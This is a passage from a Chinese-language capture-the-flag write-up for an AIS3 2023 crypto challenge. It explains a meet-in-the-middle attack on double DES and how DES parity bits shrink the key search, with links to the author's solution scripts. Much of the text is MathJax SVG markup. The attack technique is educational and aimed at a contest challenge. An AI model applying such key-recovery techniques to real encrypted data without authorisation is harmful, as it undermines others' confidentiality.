549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 的時間。</p><p>接著來列舉 <code>decrypt(hint, key2, iv)</code>，由於（1），所以當 <code>key2</code> 是正確的時候，一定可以在 middle 裡面找到  <code>decrypt(hint, key2, iv)</code>，所以那個 middle 所對應到的 <code>key1</code> <code>key2</code> 就很可能是正確的，這步驟最多需列舉 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 個 <code>key2</code>，每次找尋 <code>middle</code> 若使用的是 Javascript 的 map 或 Python 的 dict 所花的時間在一般情況下會是 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.692ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2074 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="4F" d="M308 428Q289 428 289 438Q289 457 318 508T378 593Q417 638 475 671T599 705Q688 705 732 643T777 483Q777 380 733 285T620 123T464 18T293 -22Q188 -22 123 51T58 245Q58 327 87 403T159 533T249 626T333 685T388 705Q404 705 404 693Q404 674 363 649Q333 632 304 606T239 537T181 429T158 290Q158 179 214 114T364 48Q489 48 583 165T677 438Q677 473 670 505T648 568T601 617T528 636Q518 636 513 635Q486 629 460 600T419 544T392 490Q383 470 372 459Q341 430 308 428Z"></path></g></g><g data-mml-node="mo" transform="translate(796,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1185,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1685,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，所以此步驟需花費 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 的時間。</p><p>所以所需花的時間從原本的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="14.539ex" height="2.09ex" role="img" focusable="false" viewBox="0 -841.7 6426.3 923.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1512.3,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(2512.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(4080.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(5136.2,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 變成了 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="14.539ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 6426.3 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1512.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msup" transform="translate(2512.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(4080.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(5136.2,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>，變的看起來可行了。</p><p>不過還有一個問題：存 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 種可能的 middle 會耗掉太多空間然後噴錯（有人還把這個做成<a href="/ais3-pre-exam-2023-write-up/2des-meme.webp">梗圖</a>）。</p><h6 id="DES-Key-Transformation"><a href="#DES-Key-Transformation" class="headerlink" title="DES Key Transformation"></a>DES Key Transformation</h6><p>DES 在拿到 64 bits 的 key 的時候，會把一些東西丟掉變成 56 bits 的 key，所以實際上需要列舉的 <code>key1</code> <code>key2</code> 其實可以更少。</p><p>DES 的 64 bits 的 key 中，第 8, 16, 24, 32, 40, 48, 56, 64 個 bit 是會被丟掉的，不會影響到加解密，所以需列舉的 <code>key1</code> <code>key2</code> 其實各只有 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.904ex" role="img" focusable="false" viewBox="0 -841.7 1290.1 841.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 種。</p><p>提供我的 Javascript 及 Python 解，都可在 200 秒內於我的電腦上跑出結果，Javascript 比較快。</p><p><a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/crypto/2des/exp/exp.js">Javascript 解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/crypto/2des/exp/exp.py">Python 解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>這題也有人不透過 DES Key Transformation 的特性來解：既然存 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 